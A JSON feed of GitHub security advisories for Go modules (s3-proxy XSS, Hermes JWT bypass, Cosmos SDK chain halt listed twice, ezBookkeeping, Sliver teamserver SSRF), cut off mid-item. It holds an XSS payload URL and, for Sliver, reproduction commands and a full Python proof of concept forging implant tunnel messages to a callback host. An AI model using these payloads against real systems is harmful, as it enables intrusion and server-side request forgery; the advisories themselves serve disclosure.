{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Reflected Cross-site Scripting (XSS) vulnerability enables attackers to create malicious URLs that, when visited, inject scripts into the web application. This can lead to session hijacking or phishing attacks on a trusted domain, posing a high risk to all users.</p>\n<h3 id=\"details\">Details</h3>\n<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>\nIt's possible to inject html elements, including scripts through the <a href=\"https://github.com/oxyno-zeta/s3-proxy/blob/master/templates/folder-list.tpl#L19C21-L19C38\">folder-list template</a>. It seems like the <code>.Request.URL.Path</code> variable is not escaped.</p>\n<p>I did some research and found it might be due to the <code>text/template</code> import being used in <a href=\"https://github.com/oxyno-zeta/s3-proxy/blob/master/pkg/s3-proxy/utils/templateutils/template.go#L8\">the template implementation</a>, instead of the <a href=\"https://pkg.go.dev/html/template\">safer</a> <code>html/template</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em>\nUsing the <a href=\"https://oxyno-zeta.github.io/s3-proxy/configuration/structure/#targettemplateconfig\">default template configuration</a>, the vulnerability can be reproduced with the following steps.</p>\n<ol>\n<li><p>Navigate to <code>https://your-s3-proxy.com/path-not-found</code> and confirm the page looks as follows:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/1c87e274-18ec-4eb3-94fe-25bb1c0abf37\"></p>\n</li>\n<li><p>Try inserting an HTML element by changing <code>/path-not-found</code> to <code>/&lt;img src=\"x\"&gt;</code> and confirm the page looks as follows:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/19c80f46-c406-4e5f-81f3-16103bc963b8\"></p>\n</li>\n<li><p>Now it should be possible to run any JavaScript by manipulating the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#image_loading_errors\"><code>onerror</code> property of the img element</a>. This should make the link look like <code>https://your-s3-proxy.com/&lt;img src=\"x\" onerror=\"alert(1)\"&gt;</code>. Confirm that going to this URL will in fact shows an alert in the browser.</p>\n</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>The affected template allows users to interact with the URL path provided by the <code>Request.URL.Path</code> variable, which is then rendered directly into the HTML without proper sanitization or escaping. This can be abused by attackers who craft a malicious URL containing injected HTML or JavaScript. When users visit such a URL, the malicious script will be executed in the user's context, leading to potential risks such as:</p>\n<ul>\n<li><strong>Session Hijacking</strong>: Malicious scripts could be used to steal session cookies or other sensitive information.</li>\n<li><strong>Phishing Attacks</strong>: JavaScript could be injected to trick users into submitting sensitive information, such as login credentials.</li>\n</ul>\n<p>This vulnerability can be exploited by attackers who craft URLs containing malicious payloads, which would then execute in the user's browser when they access the affected page. This poses a <strong>high</strong> risk to all users who visit such URLs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/oxyno-zeta/s3-proxy/security/advisories/GHSA-pp9m-qf39-hxjc\">https://github.com/oxyno-zeta/s3-proxy/security/advisories/GHSA-pp9m-qf39-hxjc</a></li>\n<li><a href=\"https://github.com/oxyno-zeta/s3-proxy/commit/c611c741ed4872ea3f46232be23bb830f96f9564\">https://github.com/oxyno-zeta/s3-proxy/commit/c611c741ed4872ea3f46232be23bb830f96f9564</a></li>\n<li><a href=\"https://github.com/oxyno-zeta/s3-proxy/releases/tag/v4.18.1\">https://github.com/oxyno-zeta/s3-proxy/releases/tag/v4.18.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27088\">https://nvd.nist.gov/vuln/detail/CVE-2025-27088</a></li>\n<li><a href=\"https://github.com/oxyno-zeta/s3-proxy/blob/master/templates/folder-list.tpl#L19C21-L19C38\">https://github.com/oxyno-zeta/s3-proxy/blob/master/templates/folder-list.tpl#L19C21-L19C38</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pp9m-qf39-hxjc\">https://github.com/advisories/GHSA-pp9m-qf39-hxjc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pp9m-qf39-hxjc",
            "title": "[github.com/oxyno-zeta/s3-proxy/cmd/s3-proxy] S3-Proxy allows Reflected Cross-site Scripting (XSS) in template implementation",
            "date_modified": "2025-02-21T16:10:53.000Z",
            "date_published": "2025-02-20T22:18:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pp9m-qf39-hxjc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Hermes versions up to 0.4.0 improperly validated the JWT provided when using the AWS ALB authentication mode, potentially allowing for authentication bypass. This vulnerability, CVE-2025-1293, was fixed in Hermes 0.5.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1293\">https://nvd.nist.gov/vuln/detail/CVE-2025-1293</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2025-03-hashicorp-hermes-improperly-validates-aws-alb-jwts-which-may-lead-to-authentication-bypass/73371\">https://discuss.hashicorp.com/t/hcsec-2025-03-hashicorp-hermes-improperly-validates-aws-alb-jwts-which-may-lead-to-authentication-bypass/73371</a></li>\n<li><a href=\"https://github.com/hashicorp-forge/hermes/commit/e36d479616099bd0c8dfde6786ea671f112d9106\">https://github.com/hashicorp-forge/hermes/commit/e36d479616099bd0c8dfde6786ea671f112d9106</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vxm9-8mfw-vc6g\">https://github.com/advisories/GHSA-vxm9-8mfw-vc6g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vxm9-8mfw-vc6g",
            "title": "[github.com/hashicorp-forge/hermes] Hermes improperly validates a JWT",
            "date_modified": "2025-02-20T20:19:02.000Z",
            "date_published": "2025-02-20T03:32:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vxm9-8mfw-vc6g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Name: ASA-2025-003: Groups module can halt chain when handling a malicious proposal\nComponent: CosmosSDK\nCriticality: High (Considerable Impact; Likely Likelihood per <a href=\"https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md\">ACMv1.2</a>)\nAffected versions: &lt;= v0.47.15, &lt;= 0.50.11\nAffected users: Validators, Full nodes, Users on chains that utilize the groups module</p>\n<h3 id=\"description\">Description</h3>\n<p>An issue was discovered in the groups module where a malicious proposal would result in a division by zero, and subsequently halt a chain due to the resulting error. Any user that can interact with the groups module can introduce this state.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The new Cosmos SDK release <a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12\">v0.50.12</a> and <a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16\">v0.47.16</a> fix this issue.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no known workarounds for this issue.  It is advised that chains apply the update.</p>\n<h3 id=\"timeline\">Timeline</h3>\n<ul>\n<li>February 9, 2025, 5:18pm PST: Issue reported to the Cosmos Bug Bounty program</li>\n<li>February 9, 2025, 8:12am PST: Issue triaged by Amulet on-call, and distributed to Core team</li>\n<li>February 9, 2025, 12:25pm PST: Core team completes validation of issue</li>\n<li>February 18, 2025, 8:00am PST / 17:00 CET: Pre-notification delivered</li>\n<li>February 20, 2025, 8:00am PST / 17:00 CET: Patch made available</li>\n</ul>\n<p>This issue was reported to the Cosmos Bug Bounty Program by <a href=\"https://github.com/dongsam\">dongsam</a> on HackerOne on February 9, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href=\"mailto:security@interchain.io\">security@interchain.io</a>. For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see <a href=\"https://github.com/interchainio/security\">https://github.com/interchainio/security</a>.  </p>\n<p>A Github Security Advisory for this issue is available in the Cosmos SDK <a href=\"https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p\">repository</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p\">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea\">https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16\">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12\">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x5vx-95h7-rv4p\">https://github.com/advisories/GHSA-x5vx-95h7-rv4p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x5vx-95h7-rv4p",
            "title": "[github.com/cosmos/cosmos-sdk] Cosmos SDK: Groups module can halt chain when handling a malicious proposal",
            "date_modified": "2025-02-20T20:18:26.000Z",
            "date_published": "2025-02-20T20:18:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x5vx-95h7-rv4p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Name: ASA-2025-003: Groups module can halt chain when handling a malicious proposal\nComponent: CosmosSDK\nCriticality: High (Considerable Impact; Likely Likelihood per <a href=\"https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md\">ACMv1.2</a>)\nAffected versions: &lt;= v0.47.15, &lt;= 0.50.11\nAffected users: Validators, Full nodes, Users on chains that utilize the groups module</p>\n<h3 id=\"description\">Description</h3>\n<p>An issue was discovered in the groups module where a malicious proposal would result in a division by zero, and subsequently halt a chain due to the resulting error. Any user that can interact with the groups module can introduce this state.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The new Cosmos SDK release <a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12\">v0.50.12</a> and <a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16\">v0.47.16</a> fix this issue.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no known workarounds for this issue.  It is advised that chains apply the update.</p>\n<h3 id=\"timeline\">Timeline</h3>\n<ul>\n<li>February 9, 2025, 5:18pm PST: Issue reported to the Cosmos Bug Bounty program</li>\n<li>February 9, 2025, 8:12am PST: Issue triaged by Amulet on-call, and distributed to Core team</li>\n<li>February 9, 2025, 12:25pm PST: Core team completes validation of issue</li>\n<li>February 18, 2025, 8:00am PST / 17:00 CET: Pre-notification delivered</li>\n<li>February 20, 2025, 8:00am PST / 17:00 CET: Patch made available</li>\n</ul>\n<p>This issue was reported to the Cosmos Bug Bounty Program by <a href=\"https://github.com/dongsam\">dongsam</a> on HackerOne on February 9, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href=\"mailto:security@interchain.io\">security@interchain.io</a>. For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see <a href=\"https://github.com/interchainio/security\">https://github.com/interchainio/security</a>.  </p>\n<p>A Github Security Advisory for this issue is available in the Cosmos SDK <a href=\"https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p\">repository</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p\">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea\">https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16\">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12\">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x5vx-95h7-rv4p\">https://github.com/advisories/GHSA-x5vx-95h7-rv4p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x5vx-95h7-rv4p",
            "title": "[github.com/cosmos/cosmos-sdk] Cosmos SDK: Groups module can halt chain when handling a malicious proposal",
            "date_modified": "2025-02-20T20:18:26.000Z",
            "date_published": "2025-02-20T20:18:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x5vx-95h7-rv4p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the token component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57604\">https://nvd.nist.gov/vuln/detail/CVE-2024-57604</a></li>\n<li><a href=\"https://github.com/mayswind/ezbookkeeping/issues/33\">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>\n<li><a href=\"https://hkohi.ca/vulnerability/2\">https://hkohi.ca/vulnerability/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpg8-8x9c-p9gv\">https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpg8-8x9c-p9gv",
            "title": "[github.com/mayswind/ezbookkeeping] MaysWind ezBookkeeping has Improper Privilege Management",
            "date_modified": "2025-02-20T00:12:38.000Z",
            "date_published": "2025-02-13T00:33:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpg8-8x9c-p9gv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so</p>\n<h3 id=\"reproduction-steps\">Reproduction steps</h3>\n<p>Run server</p>\n<pre><code>wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux\nchmod +x sliver-server_linux\n./sliver-server_linux\n</code></pre>\n<p>Generate binary</p>\n<pre><code>generate --mtls 127.0.0.1:8443\n</code></pre>\n<p>Run it on windows, then <code>Task manager -&gt; find process -&gt; Create memory dump file</code></p>\n<p>Install RogueSliver and get the certs</p>\n<pre><code>git clone https://github.com/ACE-Responder/RogueSliver.git\npip3 install -r requirements.txt --break-system-packages\npython3 ExtractCerts.py implant.dmp\n</code></pre>\n<p>Start callback listener. Teamserver will connect when POC is run and send \"ssrf poc\" to nc</p>\n<pre><code>nc -nvlp 1111\n</code></pre>\n<p>Run the poc (pasted at bottom of this file)</p>\n<pre><code>python3 poc.py &lt;SLIVER IP&gt; &lt;MTLS PORT&gt; &lt;CALLBACK IP&gt; &lt;CALLBACK PORT&gt;\npython3 poc.py 192.168.1.33 8443 44.221.186.72 1111\n</code></pre>\n<h3 id=\"details\">Details</h3>\n<p>We see here an envelope is read from the connection and if the envelope.Type matches a handler the handler will be executed</p>\n<pre><code class=\"language-go\">func handleSliverConnection(conn net.Conn) {\n    mtlsLog.Infof(\"Accepted incoming connection: %s\", conn.RemoteAddr())\n    implantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())\n\n    defer func() {\n        mtlsLog.Debugf(\"mtls connection closing\")\n        conn.Close()\n        implantConn.Cleanup()\n    }()\n\n    done := make(chan bool)\n    go func() {\n        defer func() {\n            done &lt;- true\n        }()\n        handlers := serverHandlers.GetHandlers()\n        for {\n            envelope, err := socketReadEnvelope(conn)\n            if err != nil {\n                mtlsLog.Errorf(\"Socket read error %v\", err)\n                return\n            }\n            implantConn.UpdateLastMessage()\n            if envelope.ID != 0 {\n                implantConn.RespMutex.RLock()\n                if resp, ok := implantConn.Resp[envelope.ID]; ok {\n                    resp &lt;- envelope // Could deadlock, maybe want to investigate better solutions\n                }\n                implantConn.RespMutex.RUnlock()\n            } else if handler, ok := handlers[envelope.Type]; ok {\n                mtlsLog.Debugf(\"Received new mtls message type %d, data: %s\", envelope.Type, envelope.Data)\n                go func() {\n                    respEnvelope := handler(implantConn, envelope.Data)\n                    if respEnvelope != nil {\n                        implantConn.Send &lt;- respEnvelope\n                    }\n                }()\n            }\n        }\n    }()\n\nLoop:\n    for {\n        select {\n        case envelope := &lt;-implantConn.Send:\n            err := socketWriteEnvelope(conn, envelope)\n            if err != nil {\n                mtlsLog.Errorf(\"Socket write failed %v\", err)\n                break Loop\n            }\n        case &lt;-done:\n            break Loop\n        }\n    }\n    mtlsLog.Debugf(\"Closing implant connection %s\", implantConn.ID)\n}\n</code></pre>\n<p>The available handlers:</p>\n<pre><code class=\"language-go\">func GetHandlers() map[uint32]ServerHandler {\n    return map[uint32]ServerHandler{\n        // Sessions\n        sliverpb.MsgRegister:    registerSessionHandler,\n        sliverpb.MsgTunnelData:  tunnelDataHandler,\n        sliverpb.MsgTunnelClose: tunnelCloseHandler,\n        sliverpb.MsgPing:        pingHandler,\n        sliverpb.MsgSocksData:   socksDataHandler,\n\n        // Beacons\n        sliverpb.MsgBeaconRegister: beaconRegisterHandler,\n        sliverpb.MsgBeaconTasks:    beaconTasksHandler,\n\n        // Pivots\n        sliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,\n        sliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,\n    }\n}\n</code></pre>\n<p>If we send an envelope with the envelope.Type equaling MsgTunnelData, we will enter the <code>tunnelDataHandler</code> function</p>\n<pre><code class=\"language-go\">// The handler mutex prevents a send on a closed channel, without it\n// two handlers calls may race when a tunnel is quickly created and closed.\nfunc tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {\n    session := core.Sessions.FromImplantConnection(implantConn)\n    if session == nil {\n        sessionHandlerLog.Warnf(\"Received tunnel data from unknown session: %v\", implantConn)\n        return nil\n    }\n    tunnelHandlerMutex.Lock()\n    defer tunnelHandlerMutex.Unlock()\n    tunnelData := &amp;sliverpb.TunnelData{}\n    proto.Unmarshal(data, tunnelData)\n\n    sessionHandlerLog.Debugf(\"[DATA] Sequence on tunnel %d, %d, data: %s\", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)\n\n    rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)\n    if rtunnel != nil &amp;&amp; session.ID == rtunnel.SessionID {\n        RTunnelDataHandler(tunnelData, rtunnel, implantConn)\n    } else if rtunnel != nil &amp;&amp; session.ID != rtunnel.SessionID {\n        sessionHandlerLog.Warnf(\"Warning: Session %s attempted to send data on reverse tunnel it did not own\", session.ID)\n    } else if rtunnel == nil &amp;&amp; tunnelData.CreateReverse == true {\n        createReverseTunnelHandler(implantConn, data)\n        //RTunnelDataHandler(tunnelData, rtunnel, implantConn)\n    } else {\n        tunnel := core.Tunnels.Get(tunnelData.TunnelID)\n        if tunnel != nil {\n            if session.ID == tunnel.SessionID {\n                tunnel.SendDataFromImplant(tunnelData)\n            } else {\n                sessionHandlerLog.Warnf(\"Warning: Session %s attempted to send data on tunnel it did not own\", session.ID)\n            }\n        } else {\n            sessionHandlerLog.Warnf(\"Data sent on nil tunnel %d\", tunnelData.TunnelID)\n        }\n    }\n\n    return nil\n}\n</code></pre>\n<p>The <code>createReverseTunnelHandler</code> reads the envelope, creating a socket for <code>req.Rportfwd.Host</code> and <code>req.Rportfwd.Port</code>.  It will write <code>recv.Data</code> to it</p>\n<pre><code class=\"language-go\">func createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {\n    session := core.Sessions.FromImplantConnection(implantConn)\n\n    req := &amp;sliverpb.TunnelData{}\n    proto.Unmarshal(data, req)\n\n    var defaultDialer = new(net.Dialer)\n\n    remoteAddress := fmt.Sprintf(\"%s:%d\", req.Rportfwd.Host, req.Rportfwd.Port)\n\n    ctx, cancelContext := context.WithCancel(context.Background())\n\n    dst, err := defaultDialer.DialContext(ctx, \"tcp\", remoteAddress)\n    //dst, err := net.Dial(\"tcp\", remoteAddress)\n    if err != nil {\n        tunnelClose, _ := proto.Marshal(&amp;sliverpb.TunnelData{\n            Closed:   true,\n            TunnelID: req.TunnelID,\n        })\n        implantConn.Send &lt;- &amp;sliverpb.Envelope{\n            Type: sliverpb.MsgTunnelClose,\n            Data: tunnelClose,\n        }\n        cancelContext()\n        return nil\n    }\n\n    if conn, ok := dst.(*net.TCPConn); ok {\n        // {{if .Config.Debug}}\n        //log.Printf(\"[portfwd] Configuring keep alive\")\n        // {{end}}\n        conn.SetKeepAlive(true)\n        // TODO: Make KeepAlive configurable\n        conn.SetKeepAlivePeriod(1000 * time.Second)\n    }\n\n    tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)\n    rtunnels.AddRTunnel(tunnel)\n    cleanup := func(reason error) {\n        // {{if .Config.Debug}}\n        sessionHandlerLog.Infof(\"[portfwd] Closing tunnel %d (%s)\", tunnel.ID, reason)\n        // {{end}}\n        tunnel := rtunnels.GetRTunnel(tunnel.ID)\n        rtunnels.RemoveRTunnel(tunnel.ID)\n        dst.Close()\n        cancelContext()\n    }\n\n    go func() {\n        tWriter := tunnelWriter{\n            tun:  tunnel,\n            conn: implantConn,\n        }\n        // portfwd only uses one reader, hence the tunnel.Readers[0]\n        n, err := io.Copy(tWriter, tunnel.Readers[0])\n        _ = n // avoid not used compiler error if debug mode is disabled\n        // {{if .Config.Debug}}\n        sessionHandlerLog.Infof(\"[tunnel] Tunnel done, wrote %v bytes\", n)\n        // {{end}}\n\n        cleanup(err)\n    }()\n\n    tunnelDataCache.Add(tunnel.ID, req.Sequence, req)\n\n    // NOTE: The read/write semantics can be a little mind boggling, just remember we're reading\n    // from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence\n    // is used here whereas WriteSequence is used for data written back to the server\n\n    // Go through cache and write all sequential data to the reader\n    for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {\n        // {{if .Config.Debug}}\n        //sessionHandlerLog.Infof(\"[tunnel] Write %d bytes to tunnel %d (read seq: %d)\", len(recv.Data), recv.TunnelID, recv.Sequence)\n        // {{end}}\n        tunnel.Writer.Write(recv.Data)\n\n        // Delete the entry we just wrote from the cache\n        tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())\n        tunnel.IncReadSequence() // Increment sequence counter\n\n        // {{if .Config.Debug}}\n        //sessionHandlerLog.Infof(\"[message just received] %v\", tunnelData)\n        // {{end}}\n    }\n\n    //If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.\n    //Send a Resend packet to have the msg resent from the cache\n    if tunnelDataCache.Len(tunnel.ID) &gt; 3 {\n        data, err := proto.Marshal(&amp;sliverpb.TunnelData{\n            Sequence: tunnel.WriteSequence(), // The tunnel write sequence\n            Ack:      tunnel.ReadSequence(),\n            Resend:   true,\n            TunnelID: tunnel.ID,\n            Data:     []byte{},\n        })\n        if err != nil {\n            // {{if .Config.Debug}}\n            //sessionHandlerLog.Infof(\"[shell] Failed to marshal protobuf %s\", err)\n            // {{end}}\n        } else {\n            // {{if .Config.Debug}}\n            //sessionHandlerLog.Infof(\"[tunnel] Requesting resend of tunnelData seq: %d\", tunnel.ReadSequence())\n            // {{end}}\n            implantConn.RequestResend(data)\n        }\n    }\n    return nil\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>For current POC, mostly just leaking teamserver origin IP behind redirectors. I am 99% sure you can get full read SSRF but POC is blind only right now</p>\n<p>To exploit this for MTLS listeners, you will need MTLS keys\nFor HTTP listeners, you will need to generate valid nonce\nNot sure about other transport types</p>\n<h3 id=\"poc\">POC</h3>\n<p>POC code, it is not cleaned up at all, please forgive me</p>\n<pre><code class=\"language-python\">#!/usr/bin/python\nimport sys\nimport time\nimport base64\nimport socket, ssl\nfrom RogueSliver.consts import msgs\nimport random\nimport struct\nimport RogueSliver.sliver_pb2 as sliver\nimport json\nimport argparse\nimport uuid\nfrom google.protobuf import json_format\nfrom rich import print\nimport random\nimport string\n\nssl_ctx = ssl.create_default_context()\nssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')\nssl_ctx.load_verify_locations('certs/ca.crt')\nssl_ctx.check_hostname = False\nssl_ctx.verify_mode = ssl.CERT_NONE\n\n\n\ndef generate_random_string(length=8):\n    # Combine letters and digits\n    characters = string.ascii_letters + string.digits\n    # Generate random string\n    random_string = ''.join(random.choice(characters) for _ in range(length))\n    return random_string\n\ndef rand_unicode(junk_sz):\n  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()\n  return(junk)\n\ndef junk_register(junk_sz):\n  n = generate_random_string()\n  register = {\n        \"Name\": \"chebuya\"+n,\n        \"Hostname\": \"chebuya.local\"+n,\n        \"Uuid\": \"uuid\"+n,\n        \"Username\": \"username\"+n,\n        \"Uid\": \"uid\"+n,\n        \"Gid\": \"gid\"+n,\n        \"Os\": \"os\"+n,\n        \"Arch\": \"arch\"+n,\n        \"Pid\": 10,\n        \"Filename\": \"filename\"+n,\n        \"ActiveC2\": \"activec2\"+n,\n        \"Version\": \"version\"+n,\n        \"ReconnectInterval\": 60,\n        \"ConfigID\": \"config_id\"+n,\n        \"PeerID\": -1,\n        \"Locale\": \"locale\" + n\n  }\n\n  return register\n\n\n\ndef make_ping_env():\n  reg = sliver.Ping()\n  json_format.Parse(json.dumps({}),reg)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('Ping')\n  envelope.Data = reg.SerializeToString()\n\n  return envelope\n\n\n\ndef make_rt_env():\n    \n    jdata = {\n            \"Data\": \"c3NyZiBwb2M=\",\n            \"Closed\": False,\n            \"Sequence\": 0,\n            \"Ack\": 0,\n            \"Resend\": False,\n            \"CreateReverse\": True,\n            \"rportfwd\": {\n                \"Port\": int(sys.argv[4]),\n                \"Host\": sys.argv[3],\n                \"TunnelID\": 0,\n            },\n            \"TunnelID\": 0,\n    }\n\n\n\n    reg = sliver.TunnelData()\n    json_format.Parse(json.dumps(jdata),reg)\n    envelope = sliver.Envelope()\n    envelope.Type = msgs.index('TunnelData')\n    envelope.Data = reg.SerializeToString()\n\n    return envelope\n\n\n\n\ndef send_envelope(envelope,ip,port):\n  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    with ssl_ctx.wrap_socket(s,) as ssock:\n      ssock.connect((ip,port))\n\n      print(len(envelope.SerializeToString()))\n      #data_len = struct.pack('!I', len(envelope.SerializeToString()) )\n      data_len = struct.pack('I', len(envelope.SerializeToString()) )\n\n\n\n\n      envelope3 = make_rt_env()\n      data_len3 = struct.pack('I', len(envelope3.SerializeToString()) )\n\n      print(data_len)\n\n      ssock.write(data_len + envelope.SerializeToString()) \n      ssock.write(data_len3 + envelope3.SerializeToString())\n\n\n\n    \n      # No idea why this is reqauired\n      while True:\n          time.sleep(2)\n          ssock.write(data_len3 + envelope3.SerializeToString())\n\n\n\ndef register_session(ip,port):\n  print('[yellow]\\[i][/yellow] Sending session registration.')\n  reg = sliver.Register()\n  json_format.Parse(json.dumps(junk_register(50)),reg)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('Register')\n  envelope.Data = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndef register_beacon(ip,port):\n  print('[yellow]\\[i][/yellow] Sending beacon registration.')\n  reg = sliver.BeaconRegister()\n  reg.ID = str(uuid.uuid4())\n  junk_sz = 50\n  reg.Interval = random.randint(0,10*junk_sz)\n  reg.Jitter = random.randint(0,10*junk_sz)\n  reg.NextCheckin = random.randint(0,10*junk_sz)\n  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('BeaconRegister')\n  envelope.Data = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndescription = '''\nFlood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.\n'''\n\nif __name__ == '__main__':\n  register_session(sys.argv[1], int(sys.argv[2]))\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w\">https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f\">https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27090\">https://nvd.nist.gov/vuln/detail/CVE-2025-27090</a></li>\n<li><a 